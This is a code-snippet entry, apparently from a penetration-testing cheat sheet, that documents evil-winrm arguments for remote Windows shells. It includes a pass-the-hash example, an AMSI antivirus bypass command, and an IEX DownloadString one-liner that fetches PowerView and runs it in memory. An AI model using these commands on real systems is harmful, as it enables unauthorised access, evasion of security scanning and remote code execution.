---
id: def82b4a-4b5d-4fd6-9a4a-1160ec69faf9
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:31.210412+00:00'
updated_at: '2023-04-10T20:37:59.631660+00:00'
---

# Code Snippet def82b4a

**Language**: Powershell

```powershell
evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]

The `evil-winrm` command is used to interact with a remote Windows machine over WinRM. The command provides various arguments to specify the IP address, username, password, and other details of the remote machine. The command also provides options to specify the path of scripts and executables on the remote machine. The following are the arguments that can be used with the command:

- `IP`: The IP address of the remote machine.
- `USER`: The username to use for authentication.
- `-s SCRIPTS_PATH`: The path of the scripts directory on the remote machine.
- `-e EXES_PATH`: The path of the executables directory on the remote machine.
- `-P PORT`: The port number to use for WinRM.
- `-p PASS`: The password to use for authentication.
- `-H HASH`: The NTLM hash of the password to use for authentication.
- `-U URL`: The URL to use for authentication.
- `-S`: Use SSL for WinRM.
- `-c PUBLIC_KEY_PATH`: The path of the public key file for authentication.
- `-k PRIVATE_KEY_PATH`: The path of the private key file for authentication.
- `-r REALM`: The realm to use for authentication.

Examples:

- `evil-winrm -i 10.0.0.20 -u username -H HASH`
- `evil-winrm -i 10.0.0.20 -u username -p password -r domain.local`

*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```
